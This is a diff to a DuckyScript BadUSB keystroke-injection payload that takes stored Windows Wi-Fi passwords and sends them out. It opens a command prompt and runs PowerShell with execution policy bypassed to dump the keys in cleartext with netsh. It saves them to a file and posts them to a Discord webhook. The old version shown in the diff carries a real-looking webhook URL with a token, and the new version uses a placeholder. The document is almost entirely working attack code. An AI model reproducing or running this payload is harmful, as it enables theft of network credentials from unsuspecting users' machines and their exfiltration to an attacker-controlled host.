@@ -1,18 +1,27 @@
+REM Title: Windows Wifi Password Exfil
+REM Author: Chris Garey
+REM Description: Extracts stored Wifi Passwords and sends to a discord server channel.
+REM Original: https://github.com/cgarey2014/BadUSB-Scripts/blob/main/windows_key_steal.txt
+REM Target:	Windows 
+
+REM Waits for connection
+DELAY 500
+
+REM Opens a command prompt
 GUI r
 DELAY 500
-STRING CMD
+STRING cmd
 ENTER
-DELAY 1500
-STRING cd %temp%
-ENTER
-DELAY 300
-STRING netsh wlan export profile key=clear
-ENTER
+
+REM Takes the current stored Wifi Passwords, and appends them to a text file
 DELAY 500
-STRING powershell $wifiProfiles = netsh wlan show profiles | Select-String -Pattern '(?<=:\s)(.*)'; $wifiData = ""; foreach ($profile in $wifiProfiles) { $profileName = $profile.Matches[0].Value.Trim(); $profileXml = netsh wlan export profile name=$profileName key=clear folder=. | Out-Null; $profileXmlPath = "$($env:TEMP)\Wi-Fi-$profileName.xml"; $wifiData += Get-Content $profileXmlPath -Raw | Select-String -Pattern 'keyMaterial'; Remove-Item $profileXmlPath -Force }
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "$profiles = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { ($_ -split ': ')[1].Trim() }; $passwords = foreach ($profile in $profiles) { netsh wlan show profile name=$profile key=clear | Select-String 'Key Content' | ForEach-Object { $_.Line } }; $passwords | Out-File -FilePath $env:USERPROFILE\wifi_passwords.txt"
 ENTER
+
+REM Takes the created txt file and sends it to discord webhook
+REM Replace 'YOUR_WEBHOOK_HERE' with your webhook.
 DELAY 500
-STRING powershell if ($wifiData) { $payload = @{ content = $wifiData }; $jsonPayload = $payload | ConvertTo-Json; Invoke-RestMethod -Uri 'https://discordapp.com/api/webhooks/1255938585807556681/uBrsnBbvX371VoeEp1ZiuLapo_7m_Ge0jwxivAmPRQlDn6RmOarLGGxLx_PZxWW731SW' -Method Post -Body $jsonPayload -ContentType 'application/json' } else { Write-Output 'No Wi-Fi passwords found.' }
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "$passwords = Get-Content -Path $env:USERPROFILE\wifi_passwords.txt -Raw; $body = @{content=$passwords}; Invoke-WebRequest -Uri 'YOUR_WEBHOOK_HERE' -Method Post -ContentType 'application/x-www-form-urlencoded' -Body $body"
 ENTER
 DELAY 1000
 STRING exit
